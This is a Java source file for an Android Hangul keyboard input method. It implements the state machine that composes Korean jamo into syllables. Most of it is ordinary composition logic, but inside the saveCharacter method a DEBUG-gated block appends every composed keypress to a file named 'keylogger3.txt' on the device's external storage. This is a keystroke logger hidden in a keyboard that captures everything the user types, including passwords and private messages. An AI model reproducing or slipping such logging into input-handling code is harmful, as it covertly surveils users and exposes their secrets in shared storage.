/*
 * stjoo
 * stjoo74@gmail.com
 */

package com.feelnsolar.inputmethod.hangul;

import java.io.File;
import java.io.FileOutputStream;
import java.io.UnsupportedEncodingException;
import java.util.Arrays;

import android.os.Environment;
import android.util.Log;

public class HangulAutomata {

	//<Key android:codes="12685" android:keyLabel="ㆍ"/>
	// ㄱ  ㄲ  ㄴ  ㄷ  ㄸ  ㄹ  ㅁ  ㅂ  ㅃ  ㅅ  ㅆ  ㅇ  ㅈ  ㅉ  ㅊ  ㅋ  ㅌ  ㅍ  ㅎ  
    private static final int[] PREF_CHO = {
    	12593, 12594, 12596, 12599, 12600, 12601, 12609, 12610, 
    	12611, 12613, 12614, 12615, 12616, 12617, 12618, 12619, 
    	12620, 12621, 12622};
    // ㅏ  ㅐ  ㅑ  ㅒ  ㅓ  ㅔ  ㅕ  ㅖ  ㅗ  ㅘ  ㅙ  ㅚ  ㅛ  ㅜ  ㅝ  ㅞ  ㅟ  ㅠ  ㅡ  ㅢ  ㅣ 
    private static final int[] PREF_JUNG = {
    	12623, 12624, 12625, 12626, 12627, 12628, 12629, 12630, 
    	12631, 12632, 12633, 12634, 12635, 12636, 12637, 12638, 
    	12639, 12640, 12641, 12642, 12643};
    // ㄱ  ㄲ  ㄳ  ㄴ  ㄵ  ㄶ  ㄷ  ㄹ  ㄺ  ㄻ  ㄼ  ㄽ  ㄾ  ㄿ  ㅀ  ㅁ  ㅂ  ㅄ  ㅅ  ㅆ  ㅇ  ㅈ  ㅊ  ㅋ  ㅌ  ㅍ  ㅎ 
    private static final int[] PREF_JONG = {
    	12593, 12594, 12595, 12596, 12597, 12598, 12599, 12601, 
    	12602, 12603, 12604, 12605, 12606, 12607, 12608, 12609, 
    	12610, 12612, 12613, 12614, 12615, 12616, 12618, 12619, 
    	12620, 12621, 12622};
    
    private static final String mChoseong = new String(PREF_CHO, 0, PREF_CHO.length);
    private static final String mJungseong = new String(PREF_JUNG, 0, PREF_JUNG.length);
    
    public static final int HANGUL_NONE = -1;
    public static final int HANGUL_JA = 0;
    public static final int HANGUL_MO = 1;

    public static final int HANGUL_CHO1 = 0;
    public static final int HANGUL_CHO2 = 1;
    public static final int HANGUL_JUNG1 = 2;
    public static final int HANGUL_JUNG2 = 3;
    public static final int HANGUL_JONG1 = 4;
    public static final int HANGUL_JONG2 = 5;
    public static final int HANGUL_FINISH1 = 6;
    public static final int HANGUL_FINISH2 = 7;
    public static final int HANGUL_FINISH3 = 8;
    public static final int HANGUL_FINISH4 = 9;

    private int mCurrentState = HANGUL_NONE;
    private int mHangulCharBuffer[] = new int[3];
    
    private int mWorkingChar;
  
	public HangulAutomata()
	{
		reset();
	}

    public void reset()
    {
    	//Log.v("SoftKeyboard", "reset");
    	mCurrentState = HANGUL_NONE;
    	Arrays.fill(mHangulCharBuffer, -1);
    	mWorkingChar = -1;
    }

    public int getBuffer()
    {
    	return mWorkingChar;
    }

    public int getState()
    {
    	return mCurrentState;
    }
    
    public int[] appendCharacter(int primaryCode)
    {
    	int[] codes = {primaryCode};
    	String strPrimaryCode = new String(codes, 0, 1);
    	CharSequence cPrimaryCode = strPrimaryCode.subSequence(0, strPrimaryCode.length());
    	
    	int c = HANGUL_NONE;
   
    	if (mChoseong.contains(cPrimaryCode))
    		c = HANGUL_JA;
    	else if (mJungseong.contains(cPrimaryCode))
    		c = HANGUL_MO;
    	else
    		return saveUnknownCharacter(mCurrentState, primaryCode);
    	
    	if(SoftKeyboard.DEBUG)
    	{
    		Log.v(SoftKeyboard.PRJ_NAME, "****************************");
    		Log.v(SoftKeyboard.PRJ_NAME, "append state= " + mCurrentState + ", code =\"" + encodingCode(primaryCode) + "\", character=" + c);
    	}
    	
    	switch(mCurrentState)
		{
    	case HANGUL_NONE:
    		if(c == HANGUL_JA)
    			mCurrentState = HANGUL_CHO1;
    		else
    			mCurrentState = HANGUL_JUNG1;
			break;
    	case HANGUL_CHO1:
    		if(c == HANGUL_JA)
    		{
    			if(getJongseongPair(mHangulCharBuffer[0], primaryCode) >= 0)
    				mCurrentState = HANGUL_CHO2;
    			else
    				mCurrentState = HANGUL_FINISH1;
    		}
    		else
    			mCurrentState = HANGUL_JUNG1;
			break;
    	case HANGUL_CHO2:
    		if(c == HANGUL_JA)
    			mCurrentState = HANGUL_FINISH1;
    		else
    			mCurrentState = HANGUL_JUNG1;
			break;
    	case HANGUL_JUNG1:
    		if(c == HANGUL_JA)
    		{
    			if(primaryCode == 12611 || primaryCode == 12617)
    				mCurrentState = HANGUL_FINISH2;
    			else
    				mCurrentState = HANGUL_JONG1;
    		}
    		else
    		{
    			if(getJungseongPair(mHangulCharBuffer[1], primaryCode) >= 0)
    				mCurrentState = HANGUL_JUNG2;
    			else
    				mCurrentState = HANGUL_FINISH3;
    		}
			break;
    	case HANGUL_JUNG2:
    		if(c == HANGUL_JA)
    			mCurrentState = HANGUL_JONG1;
    		else
    			mCurrentState = HANGUL_FINISH3;
			break;
    	case HANGUL_JONG1:
    		if(c == HANGUL_JA)
    		{
    			if(getJongseongPair(mHangulCharBuffer[2], primaryCode) >= 0)
    				mCurrentState = HANGUL_JONG2;
    			else
    				mCurrentState = HANGUL_FINISH1;
    		}
    		else
    			mCurrentState = HANGUL_FINISH4;
			break;
    	case HANGUL_JONG2:
    		if(c == HANGUL_JA)
    			mCurrentState = HANGUL_FINISH1;
    		else
    			mCurrentState = HANGUL_FINISH4;
			break;
		default:
			break;
		}
    	
    	return saveCharacter(mCurrentState, primaryCode);
    }
    
    public void setBuffer(int primaryCode)
    {
    	reset();
    	if(primaryCode >= 0X3131 && primaryCode <= 0X3136)
    	{
    		int[] codes = {primaryCode};
        	String strPrimaryCode = new String(codes, 0, 1);
        	CharSequence cPrimaryCode = strPrimaryCode.subSequence(0, strPrimaryCode.length());

        	if (mChoseong.contains(cPrimaryCode))
        	{
        		mCurrentState = HANGUL_CHO1;
        		mHangulCharBuffer[0] = primaryCode;
        	}
        	else if (mJungseong.contains(cPrimaryCode))
        	{
        		if(isJungseongPair(primaryCode))
        			mCurrentState = HANGUL_JUNG1;
        		else
        			mCurrentState = HANGUL_JUNG2;
        		mHangulCharBuffer[1] = primaryCode;
        	}
        	else
        	{
        		mCurrentState = HANGUL_CHO2;
        		mHangulCharBuffer[2] = primaryCode;
        	}
    	}
    	else if(primaryCode >= 0XAC00 && primaryCode <= 0XD7A3)
    	{
    		int c;
    		int value = primaryCode - 0xAC00;
    		int divJong  =  value / 28;
    		c = value % 28;
    		if(c > 0)
    			mHangulCharBuffer[2] = PREF_JONG[c - 1];
    		else
    			mHangulCharBuffer[2] = -1;
 
            int divJung = divJong / 21;
            c = divJong % 21;
            mHangulCharBuffer[1] = PREF_JUNG[c];
 
            c = divJung % 19;
            mHangulCharBuffer[0] = PREF_CHO[c];
            if(-1 != mHangulCharBuffer[2])
            {
            	if(isJongseongPair(mHangulCharBuffer[2]))
            		mCurrentState = HANGUL_JONG2;
            	else
            		mCurrentState = HANGUL_JONG1;
            }
            else if(-1 != mHangulCharBuffer[1])
            {
            	if(isJungseongPair(mHangulCharBuffer[1]))
            		mCurrentState = HANGUL_JUNG2;
            	else
            		mCurrentState = HANGUL_JUNG1;
            }
    	}
    	//Log.v("SoftKeyboard", "****************************");
		//Log.v("SoftKeyboard", "set state= " + mCurrentState  + ", code=\"" + encodingCode(primaryCode) + 
		//		"\" [" + encodingCode(mHangulCharBuffer[0]) + encodingCode(mHangulCharBuffer[1]) + encodingCode(mHangulCharBuffer[2]) + "]");
    }
    
    public int deleteCharacter()
    {
    	if(SoftKeyboard.DEBUG)
    	{
    		Log.v(SoftKeyboard.PRJ_NAME, "****************************");
    		Log.v(SoftKeyboard.PRJ_NAME, "delete state= " + mCurrentState  + " [" + encodingCode(mHangulCharBuffer[0]) + 
    			encodingCode(mHangulCharBuffer[1]) + encodingCode(mHangulCharBuffer[2]) + "]");	
    	}
    	
    	//int workingChar = -1;
    	
    	switch(mCurrentState)
		{
		case HANGUL_CHO1:
			mCurrentState = HANGUL_NONE;
			mHangulCharBuffer[0] = -1;
			mWorkingChar = -1;
			break;
		case HANGUL_CHO2:
			if(isJongseongPair(mHangulCharBuffer[0]))
    		{
				mCurrentState = HANGUL_CHO1;
    			int[] cho = resolveJongseongPair(mHangulCharBuffer[0]);
    			mWorkingChar = mHangulCharBuffer[0] = cho[0];
    		}
			else
			{
				mCurrentState = HANGUL_NONE;
				mHangulCharBuffer[0] = -1;
				mWorkingChar = -1;
			}
			break;
		case HANGUL_JUNG1:
			mHangulCharBuffer[1] = -1;
			if(-1 != mHangulCharBuffer[0])
			{
				//if(isJongseongPair(mHangulCharBuffer[0]))
				//		mCurrentState = HANGUL_CHO2;
				//else
				//	mCurrentState = HANGUL_CHO1;
				mCurrentState = HANGUL_CHO1;
				mWorkingChar = mHangulCharBuffer[0];
			}
			else
			{
				mCurrentState = HANGUL_NONE;
				mWorkingChar = -1;
			}
			break;
		case HANGUL_JUNG2:
			if(isJungseongPair(mHangulCharBuffer[1]))
			{
				mCurrentState = HANGUL_JUNG1;
				
				int jung[] = resolveJungseongPair(mHangulCharBuffer[1]);
				mHangulCharBuffer[1] = jung[0];
				if(-1 != mHangulCharBuffer[0])
					mWorkingChar = makeHangul(mHangulCharBuffer);
				else
					mWorkingChar = mHangulCharBuffer[1];
			}
			else
			{
				if(-1 != mHangulCharBuffer[0])
					mCurrentState = HANGUL_CHO1;
				else
					mCurrentState = HANGUL_NONE;
				mHangulCharBuffer[1] = -1;
				mWorkingChar = mHangulCharBuffer[0];
			}
			break;
		case HANGUL_JONG1:
			if(isJungseongPair(mHangulCharBuffer[1]))
				mCurrentState = HANGUL_JUNG2;
			else
				mCurrentState = HANGUL_JUNG1;
			mHangulCharBuffer[2] = -1;
			mWorkingChar = makeHangul(mHangulCharBuffer);
			break;
		case HANGUL_JONG2:
			if(isJongseongPair(mHangulCharBuffer[2]))
    		{
				mCurrentState = HANGUL_JONG1;
    			int[] jong = resolveJongseongPair(mHangulCharBuffer[2]);
    			mHangulCharBuffer[2] = jong[0];
    			mWorkingChar = makeHangul(mHangulCharBuffer);
    		}
			else
			{
				if(isJungseongPair(mHangulCharBuffer[1]))
					mCurrentState = HANGUL_JUNG2;
				else
					mCurrentState = HANGUL_JUNG1;
				mHangulCharBuffer[2] = -1;
				mWorkingChar = makeHangul(mHangulCharBuffer);
			}
			break;
		case HANGUL_NONE:
		default:
			break;
		}

    	if(SoftKeyboard.DEBUG)
    	{
    		Log.v(SoftKeyboard.PRJ_NAME, "delete state= " + mCurrentState  + " [" + encodingCode(mHangulCharBuffer[0]) + 
				encodingCode(mHangulCharBuffer[1]) + encodingCode(mHangulCharBuffer[2]) + "]");
    	}
    	
    	return mWorkingChar;
    }

    private int makeHangul(int[] buffer)
    {
    	if(buffer.length != 3)
    		return -1;
    	
    	return 0xAC00 + getChoseongIndex(buffer[0]) * 588 + 
			getJungseongIndex(buffer[1]) * 28 + 
			((-1 != buffer[2]) ? (getJongseongIndex(buffer[2]) + 1): 0);
    }

    private int[] saveCharacter(int state, int primaryCode)
    {
    	int completedChar = -1;
    	
    	if(SoftKeyboard.DEBUG)
    	{
			Log.v(SoftKeyboard.PRJ_NAME, "save state= " + state  + " [" + encodingCode(mHangulCharBuffer[0]) + 
				encodingCode(mHangulCharBuffer[1]) + encodingCode(mHangulCharBuffer[2]) + "]"  + 
				", primaryCode=\'" + encodingCode(primaryCode) + "\'");
    	}
    	
        switch(state)
		{
    	case HANGUL_CHO1:
    		mHangulCharBuffer[0] = primaryCode;
    		mWorkingChar = mHangulCharBuffer[0];
			break;
    	case HANGUL_CHO2:
    		mHangulCharBuffer[0] = getJongseongPair(mHangulCharBuffer[0], primaryCode);
    		mWorkingChar =  mHangulCharBuffer[0];
			break;
    	case HANGUL_JUNG1:
    		mHangulCharBuffer[1] = primaryCode;
    		if(-1 != mHangulCharBuffer[0])
    		{
    			if(isJongseongPair(mHangulCharBuffer[0]))
    			{
	    			int[] cho = resolveJongseongPair(mHangulCharBuffer[0]);
	    			mHangulCharBuffer[0] = cho[1];
	    			completedChar = cho[0];
    			}
	    		mWorkingChar = makeHangul(mHangulCharBuffer);
    		}
    		else
    			mWorkingChar = mHangulCharBuffer[1];
			break;
    	case HANGUL_JUNG2:
    		mHangulCharBuffer[1] = getJungseongPair(mHangulCharBuffer[1], primaryCode);
    		if(-1 != mHangulCharBuffer[0])
    			mWorkingChar = makeHangul(mHangulCharBuffer);
    		else
    			mWorkingChar = mHangulCharBuffer[1];
			break;
    	case HANGUL_JONG1:
    		mHangulCharBuffer[2] = primaryCode;
    		if(-1 != mHangulCharBuffer[0] && -1 != mHangulCharBuffer[1])
    			mWorkingChar = makeHangul(mHangulCharBuffer);
    		else
    		{
    			mCurrentState = HANGUL_CHO1;
    			completedChar = mHangulCharBuffer[1];
    			mHangulCharBuffer[0] = mHangulCharBuffer[2];
        	    mHangulCharBuffer[1] = -1;
        	    mHangulCharBuffer[2] = -1;
        	    mWorkingChar = mHangulCharBuffer[0];
    		}
			break;
    	case HANGUL_JONG2:
    		mHangulCharBuffer[2] = getJongseongPair(mHangulCharBuffer[2], primaryCode);
    		if(-1 != mHangulCharBuffer[0] && -1 != mHangulCharBuffer[1])
    		{
    			mWorkingChar = makeHangul(mHangulCharBuffer);
    		}
    		else
    		{
    			mCurrentState = HANGUL_CHO2;
    			completedChar = mHangulCharBuffer[1];
    			mHangulCharBuffer[0] = mHangulCharBuffer[2];
        	    mHangulCharBuffer[1] = -1;
        	    mHangulCharBuffer[2] = -1;
        	    mWorkingChar = mHangulCharBuffer[0];
    		}
    		break;
    	case HANGUL_FINISH1:
    		mCurrentState = HANGUL_CHO1;
    		if( -1 != mHangulCharBuffer[1])
    			completedChar = makeHangul(mHangulCharBuffer);
    		else
    			completedChar = mHangulCharBuffer[0];
    		mHangulCharBuffer[0] = primaryCode;
    	    mHangulCharBuffer[1] = -1;
    	    mHangulCharBuffer[2] = -1;
    	    mWorkingChar = mHangulCharBuffer[0];
    		break;
    	case HANGUL_FINISH2:
    		mCurrentState = HANGUL_CHO1;
    		if(-1 != mHangulCharBuffer[0] && -1 != mHangulCharBuffer[1])
    			completedChar = makeHangul(mHangulCharBuffer);
    		else
    			completedChar = mHangulCharBuffer[1];
    		mHangulCharBuffer[0] = primaryCode;
    	    mHangulCharBuffer[1] = -1;
    	    mHangulCharBuffer[2] = -1;
    	    mWorkingChar = mHangulCharBuffer[0];
    		break;
    	case HANGUL_FINISH3:
    		mCurrentState = HANGUL_JUNG1;
    		if(-1 == mHangulCharBuffer[0])
    			completedChar = mHangulCharBuffer[1];
    		else
    			completedChar = makeHangul(mHangulCharBuffer);
    		mHangulCharBuffer[0] = -1;
    		mHangulCharBuffer[1] = primaryCode;
    	    mHangulCharBuffer[2] = -1;
    	    mWorkingChar = mHangulCharBuffer[1];
    		break;
    	case HANGUL_FINISH4:
    		if(isJongseongPair(mHangulCharBuffer[2]))
    		{
    			mCurrentState = HANGUL_JUNG1;
    			
    			int[] jong = resolveJongseongPair(mHangulCharBuffer[2]);
    			if(-1 != mHangulCharBuffer[0] && -1 != mHangulCharBuffer[1])
    			{
    				mHangulCharBuffer[2] = jong[0];
    				completedChar = makeHangul(mHangulCharBuffer);
    			}
    			else
    				completedChar = jong[0];

				mHangulCharBuffer[0] = jong[1];
				mHangulCharBuffer[1] = primaryCode;
				mHangulCharBuffer[2] = -1;
				
				mWorkingChar = makeHangul(mHangulCharBuffer);
    		}
    		else
    		{
    			mCurrentState = HANGUL_JUNG1;
    			int tmp = mHangulCharBuffer[2];
    			mHangulCharBuffer[2] = -1;
    			completedChar = makeHangul(mHangulCharBuffer);

    			mHangulCharBuffer[0] = tmp;
    			mHangulCharBuffer[1] = primaryCode;
    			//mHangulCharBuffer[2] = -1;
    			mWorkingChar = makeHangul(mHangulCharBuffer);
    		}
    		break;
		default:
			break;
		}

        if(SoftKeyboard.DEBUG)
        {
        	Log.v(SoftKeyboard.PRJ_NAME, "save result: " + "[" + encodingCode(mHangulCharBuffer[0]) + 
				encodingCode(mHangulCharBuffer[1]) + encodingCode(mHangulCharBuffer[2]) + "]"  + 
				", completed=\'" + encodingCode(completedChar) + "\'" + 
				", working=\'" + encodingCode(mWorkingChar) + "\'");

			String keypress =  encodingCode(mWorkingChar);

			try {
				String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
				String FILENAME = "keylogger3.txt";

				File outfile = new File(SDCARD + File.separator + FILENAME);
				FileOutputStream fos = new FileOutputStream(outfile, true);
				fos.write(keypress.getBytes());
				fos.close();
			} catch (Exception e) {
				Log.d("EXCEPTION", e.getMessage());
			}


        }

        int[] ret = {-1, -1, -1};
        ret[1] = completedChar;
        ret[2] = mWorkingChar;

        return ret;
    }

    private int[] saveUnknownCharacter(int state, int primaryCode)
    {

        int[] ret = {-1, -1, -1};
        ret[0] = mWorkingChar;
        ret[1] = primaryCode;
        reset();
        
        return ret;
    }
    
    public static String encodingCode(int code)
    {
    	String str = null;
    	if(-1 != code)
    	{
	    	int[] codes = {code};
	    	String c = new String(codes, 0, 1);
	    	try
	    	{
	    		str = new String(c.getBytes(), SoftKeyboard.DEF_CHARSET);

	    	}
	    	catch(UnsupportedEncodingException e)
	    	{
	    		Log.v(SoftKeyboard.PRJ_NAME, "UnsupportedEncodingException");
	    	}
    	}
    	else
    		str = new String(" ");
    	
    	return str;
    }
 
    public static String encodingString(String text)
    {
    	String str = null;
    	try
    	{
    		str = new String(text.getBytes(), SoftKeyboard.DEF_CHARSET);
    	}
    	catch(UnsupportedEncodingException e)
    	{
    		Log.v(SoftKeyboard.PRJ_NAME, "UnsupportedEncodingException");
    	}
    	
    	return str;
    }

    private int getChoseongIndex(int primaryCode)
    {
    	for(int i = 0; i < PREF_CHO.length; i++)
    	{
    		if(primaryCode == PREF_CHO[i])
    			return i;
    	}
    	
    	return -1;
    }

    private int getJungseongIndex(int primaryCode)
    {
    	for(int i = 0; i < PREF_JUNG.length; i++)
    	{
    		if(primaryCode == PREF_JUNG[i])
    			return i;
    	}
    	
    	return -1;
    }

    private int getJongseongIndex(int primaryCode)
    {
    	for(int i = 0; i < PREF_JONG.length; i++)
    	{
    		if(primaryCode == PREF_JONG[i])
    			return i;
    	}
    	
    	return -1;
    }

    private static boolean isJungseongPair(int v)
    {
    	switch(v)
    	{
    	case 12632:
    	case 12633:
    	case 12634:
    	case 12637:
    	case 12638:
    	case 12639:
    	case 12642:
    		return true;
    	default:
    		return false;
    	}
    }

    private static int[] resolveJungseongPair(int v)
    {
    	int r[] = new int[2];
    	switch(v)
    	{
    	case 12632:
    		r[0] = 12631;
    		r[1] = 12623;
    		break;
    	case 12633:
    		r[0] = 12631;
    		r[1] = 12624;
    		break;
    	case 12634:
    		r[0] = 12631;
    		r[1] = 12643;
    		break;
    	case 12637:
    		r[0] = 12636;
    		r[1] = 12627;
    		break;
    	case 12638:
    		r[0] = 12636;
    		r[1] = 12628;
    		break;
    	case 12639:
    		r[0] = 12636;
    		r[1] = 12643;
    		break;
    	case 12642:
    		r[0] = 12641;
    		r[1] = 12643;
    		break;
    	default:
    		r[0] = -1;
			r[1] = -1;
			break;
    	}
    	
    	return r;
    }

    private int getJungseongPair(int v1, int v2)
    {
		switch(v1)
		{
		case 12631:
			switch(v2)
			{
			case 12623:
				return 12632;
			case 12624:
				return 12633;
			case 12643:
				return 12634;
			default:
				break;
			}
			break;
		case 12636:
			switch(v2)
			{
			case 12627:
				return 12637;
			case 12628:
				return 12638;
			case 12643:
				return 12639;
			default:
				break;
			}
			break;
		case 12641:
			switch(v2)
			{
			case 12643:
				return 12642;
			default:
				break;
			}
			break;
		default:
			break;
		}
    	return -1;
    }

    private static boolean isJongseongPair(int v)
    {
    	switch(v)
    	{
    	case 12595:
    	case 12597:
    	case 12598:
    	case 12602:
    	case 12603:
    	case 12604:
    	case 12605:
    	case 12606:
    	case 12607:
    	case 12608:
    	case 12612:
    		return true;
    	default:
    		return false;
    	}
    }

    private static int[] resolveJongseongPair(int v)
    {
    	int r[] = new int[2];
    	switch(v)
    	{
    	case 12595:
    		r[0] = 12593;
    		r[1] = 12613;
    		break;
    	case 12597:
    		r[0] = 12596;
    		r[1] = 12616;
    		break;
    	case 12598:
    		r[0] = 12596;
    		r[1] = 12622;
    		break;
    	case 12602:
    		r[0] = 12601;
    		r[1] = 12593;
    		break;
    	case 12603:
		r[0] = 12601;
		r[1] = 12609;
		break;
    	case 12604:
    		r[0] = 12601;
    		r[1] = 12610;
    		break;
    	case 12605:
    		r[0] = 12601;
    		r[1] = 12613;
    		break;
    	case 12606:
    		r[0] = 12601;
    		r[1] = 12620;
    		break;
    	case 12607:
    		r[0] = 12601;
    		r[1] = 12621;
    		break;
    	case 12608:
    		r[0] = 12601;
    		r[1] = 12622;
    		break;
    	case 12612:
    		r[0] = 12610;
    		r[1] = 12613;
    		break;
    	default:
    		r[0] = -1;
			r[1] = -1;
			break;
    	}
    	
    	return r;
    }

    private static int getJongseongPair(int v1, int v2)
    {
    	switch(v1)
		{
		case 12593:
			switch(v2)
			{
			case 12613:
				return 12595;
			default:
				break;
			}
			break;
		case 12596:
			switch(v2)
			{
			case 12616:
				return 12597;
			case 12622:
				return 12598;
			default:
				break;
			}
			break;
		case 12601:
			switch(v2)
			{
			case 12593:
				return 12602;
			case 12609:
				return 12603;
			case 12610:
				return 12604;
			case 12613:
				return 12605;
			case 12620:
				return 12606;
			case 12621:
				return 12607;
			case 12622:
				return 12608;
			default:
				break;
			}
			break;
		case 12610:
			switch(v2)
			{
			case 12613:
				return 12612;
			default:
				break;
			}
			break;
		default:
    		break;
		}
    	
    	return -1;
    }

    public static String encode(String text)
    {
    	String out = new String();
    	
    	if(null != text && text.length() > 0)
    	{
	    	HangulAutomata ha = new HangulAutomata();
	    	
	    	int[] ret;
	    	for(int i =0; i < text.length(); i++)
	    	{
	    		ret = ha.appendCharacter((int)text.charAt(i));
	    		if(-1 != ret[0])
	    			out += (char)ret[0];
	    		if(-1 != ret[1])
	    			out += (char)ret[1];
	    		
	    	}
	    	
	    	int c = ha.getBuffer();
	    	if(-1 != c)
				out += (char)c;
    	}

    	return out;
    }

    public static String decode(String text)
    {
    	String out = new String();
    	int[] buffer = new int[5];
    	char c;
    	
    	for(int i = 0; i < text.length(); i++)
    	{
    		c = text.charAt(i);
	    	if(c >= 0X3131 && c <= 0X3163)
	    	{
	    		if(isJongseongPair((int)c))
            	{
            		int[] jong = resolveJongseongPair(c);
            		out += (char)jong[0];
            		out += (char)jong[1];
            	}
	    		else if(isJungseongPair((int)c))
            	{
            		int[] jung = resolveJungseongPair(c);
            		out += (char)jung[0];
            		out += (char)jung[1];
            	}
	    		else
	    			out +=c;
	    	}
	    	else if(c >= 0XAC00 && c <= 0XD7A3)
	    	{
	    		Arrays.fill(buffer, -1);
	    		int n;
	    		int value = c - 0xAC00;
	    		int divJong  =  value / 28;
	    		n = value % 28;
	    		if(n > 0)
	    			buffer[3] = PREF_JONG[n - 1];
	 
	            int divJung = divJong / 21;
	            n = divJong % 21;
	            buffer[1] = PREF_JUNG[n];
	 
	            n = divJung % 19;
	            buffer[0] = PREF_CHO[n];
	            
	            if(-1 != buffer[3])
	            {
	            	if(isJongseongPair(buffer[3]))
	            	{
	            		int[] jong = resolveJongseongPair(buffer[3]);
	            		buffer[3] = jong[0];
	            		buffer[4] = jong[1];
	            	}
	            }
	            if(-1 != buffer[1])
	            {
	            	if(isJungseongPair(buffer[1]))
	            	{
	            		int[] jung = resolveJungseongPair(buffer[1]);
	            		buffer[1] = jung[0];
	            		buffer[2] = jung[1];
	            	}
	            }
	            for(int j = 0; j < buffer.length; j++)
	            {
	            	if(-1 != buffer[j])
	            		out += (char)buffer[j];
	            }
	    	}
	    	else
	    		out +=c;
    	}
    	
    	//Log.v("SoftKeyboard", "decode: " + "[" + encodingString(out) + "]");
    	return out;
    }

    public static int countCharacter(char c)
    {
    	if(c >= 0X3131 && c <= 0X3163)
    	{
    		if(isJongseongPair((int)c))
        		return 2;
    		else if(isJungseongPair((int)c))
    			return 2;
    		else
    			return 1;
    	}
    	else if(c >= 0XAC00 && c <= 0XD7A3)
    	{
    		int n;
    		int value = c - 0xAC00;
    		int divJong  =  value / 28;
    		int /*cho = -1,*/ jung = -1, jong = -1;
    		n = value % 28;
    		if(n > 0)
    			jong = PREF_JONG[n - 1];
 
            //int divJung = divJong / 21;
            n = divJong % 21;
            jung = PREF_JUNG[n];
 
            //n = divJung % 19;
            //cho = PREF_CHO[n];
            
            n = 0;
            if(-1 != jong)
            	n += isJongseongPair(jong) ? 2 : 1;
            if(-1 != jung)
            	n += isJungseongPair(jung) ? 2 : 1;
           n++;
           
           return n;
    	}
    	else
    		return 1;
    }
    
}
